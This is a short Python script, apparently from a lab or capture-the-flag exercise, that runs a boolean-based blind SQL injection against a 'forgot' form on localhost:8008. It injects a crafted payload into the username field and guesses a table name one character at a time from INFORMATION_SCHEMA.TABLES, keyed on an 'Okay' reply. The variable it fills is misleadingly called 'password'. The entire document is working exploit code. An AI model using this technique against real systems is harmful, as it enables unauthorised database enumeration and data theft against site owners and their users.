import string
import requests

def query(i):
    return "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '"+i+"%' LIMIT 0,1) AND ''='"

password=""

while True:
    for i in list(string.printable):
        if "Okay" in str(requests.post("http://localhost:8008/forgot",data={"username":query(password+i)}).text):
            password+=i
            print(password)
            break